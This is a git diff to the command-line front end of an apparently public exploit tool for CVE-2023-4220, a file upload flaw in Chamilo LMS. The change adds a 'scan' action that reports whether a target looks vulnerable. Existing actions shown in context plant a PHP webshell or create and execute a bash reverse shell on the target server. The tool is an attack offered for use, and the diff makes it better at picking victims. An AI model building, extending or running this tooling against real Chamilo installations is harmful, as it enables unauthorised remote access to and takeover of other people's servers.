@@ -3,6 +3,18 @@ from exploit import ChamiloBigUploadExploit
 from os import system
 
 
+def scan_action() -> None:
+    system('clear')
+
+    result = exploit.check_target_vulnerable()
+
+    if result:
+        print('[+] Target is likely vulnerable. Go ahead. [+]')
+    else:
+        print('[-] Target is not vulnerable [-]')
+        print(f'\nCould not access {url}/main/inc/lib/javascript/bigupload/files/')
+
+
 def webshell_action() -> None:
     system('clear')
     
@@ -61,6 +73,7 @@ def revshell_action() -> None:
 
 
 actions = {
+    'scan': scan_action,
     'webshell': webshell_action,
     'revshell': revshell_action
 }
@@ -70,7 +83,7 @@ parser = ArgumentParser(
     'This is a script written in Python that allows the exploitation of the Chamilo\'s LMS software security flaw described in CVE-2023-4220'
 )
 
-parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
+parser.add_argument('-u', '--url', type=str, required=True, help='Target Root Chamilo\'s URL')
 parser.add_argument('-a', '--action', type=str, required=True, help='Action to perform on the vulnerable endpoint (webshell: Create PHP webshell file, revshell: Create and execute bash revshell file)')
 
 args = parser.parse_args()
